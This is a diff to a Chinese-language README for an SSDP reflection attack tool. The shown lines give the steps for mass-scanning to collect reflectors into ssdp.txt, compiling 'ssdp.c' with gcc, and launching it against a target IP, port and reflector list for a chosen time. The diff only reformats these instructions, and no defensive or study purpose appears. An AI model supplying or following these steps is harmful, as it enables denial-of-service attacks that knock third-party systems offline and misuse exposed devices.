@@ -23,6 +23,7 @@ make install<br>
 200处理个数  1000线程<br>
 全自动：screen ./scan 1<br>
 自动过滤跟扫描，到时候表完成过后是ssdp.txt<br>
-攻击：
-gcc -pthread ssdp.c -o ssdp
+编译攻击脚本：<br>
+gcc -pthread ssdp.c -o ssdp<br>
+攻击：<br>
 ./ssdp <target IP> <target port> <reflection file>  <time (optional)>
